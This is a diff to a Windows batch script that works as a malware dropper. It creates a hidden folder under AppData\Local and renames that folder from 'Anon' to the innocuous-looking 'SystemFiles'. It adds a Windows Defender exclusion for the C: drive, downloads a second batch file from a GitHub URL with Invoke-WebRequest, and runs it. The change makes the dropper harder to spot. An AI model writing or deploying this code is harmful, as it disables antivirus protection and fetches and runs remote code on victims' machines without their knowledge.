@@ -27,11 +27,11 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
 cd "C:\Users\%USERNAME%\AppData\Local"
-mkdir "Anon"
-attrib +h "Anon" /s /d
+mkdir "SystemFiles"
+attrib +h "SystemFiles" /s /d
 
 powershell.exe -command "Add-MpPreference -ExclusionPath "C:\
 
-Powershell -Command "Invoke-Webrequest 'https://github.com/ThisNot7/test-security-defender/raw/main/2.bat' -OutFile C:\Users\%USERNAME%\AppData\Local\Anon\2.bat"
-cd C:\Users\%USERNAME%\AppData\Local\Anon"
+Powershell -Command "Invoke-Webrequest 'https://github.com/ThisNot7/test-security-defender/raw/main/2.bat' -OutFile C:\Users\%USERNAME%\AppData\Local\SystemFiles\2.bat"
+cd C:\Users\%USERNAME%\AppData\Local\SystemFiles"
 start 2.bat
